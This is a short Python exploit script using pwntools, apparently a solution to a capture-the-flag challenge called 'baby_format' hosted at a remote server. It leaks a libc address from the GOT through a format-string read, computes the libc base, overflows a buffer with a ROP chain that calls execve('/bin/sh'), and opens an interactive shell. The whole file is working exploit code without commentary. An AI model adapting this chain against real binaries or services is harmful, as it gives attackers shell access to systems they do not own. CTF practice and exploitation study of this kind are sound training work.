#!/usr/bin/env python3

from pwn import *

context.binary = '../baby_format'
context.log_level = 'DEBUG'


def leak_data(address):
    #r = process('./baby_format')
    r.readuntil('name again?')
    r.sendline(b"%7$sAAAA" + p64(address))
    r.readuntil('ah yes ')
    data = r.readuntil('AAAA')[:-4]
    return data


r = remote('elfs.owasp.si', 40005)
#r = process('./baby_format')

def get_got_entry(entry):
    with log.progress('Leaking GOT entry for "{}"'.format(entry)) as p:
       data = leak_data(context.binary.got[entry])
       value = u64(data.ljust(8, b'\x00'))
       p.success(hex(value))
    return value


got_puts = get_got_entry('puts')


libc = ELF('./libc6_2.27-3ubuntu1.3_amd64.so')
libc.address = got_puts - libc.symbols['puts']
log.info("Libc base at {}".format(hex(libc.address)))

rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh\x00')),0,0)

# Clean up output
r.readuntil('to drink?')

#Send rop chain
r.sendline(b'A' * 120 + bytes(rop))

#Go interactive
r.interactive()
